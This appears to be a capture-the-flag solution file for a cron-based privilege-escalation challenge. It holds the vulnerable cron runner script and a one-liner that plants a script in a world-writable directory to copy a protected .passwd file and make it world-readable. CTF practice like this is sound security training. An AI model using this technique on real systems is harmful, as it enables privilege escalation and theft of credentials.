@@ -1,0 +1,36 @@
+# Crontab
+# ch4
+
+#!/bin/bash
+
+# Sortie de la commande 'crontab -l' exécutée en tant que app-script-ch4-cracked
+:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# Vous N'avez PAS à modifier la crontab(chattr +i t'façons)
+
+# Output of the command 'crontab -l' run as app-script-ch4-cracked:
+# */1 * * * * /challenge/app-script/ch4/ch4
+# You do NOT need to edit the crontab (it's chattr +i anyway)
+
+# hiding stdout/stderr
+exec 1>/dev/null 2>&1
+
+challdir=${0%/*}
+cd "$challdir"
+
+if [ ! -e "/tmp/._cron" ]; then
+        mkdir -m 733 "/tmp/._cron"
+fi
+
+for task in cron.d/*; do
+        [ -e "${task}" ] || continue
+        (ulimit -t 5; bash -p "${task}")
+done
+
+rm -rf cron.d/*
+
+
+# Solution
+echo '#!/bin/sh' > /tmp/._cron/cron; echo '/bin/cat /challenge/app-script/ch4/.passwd > /tmp/okpass ; /bin/chmod 777 /tmp/okpass' >> /tmp/._cron/cron; chmod 777 /tmp/._cron/cron
+
+cat /tmp/okpass
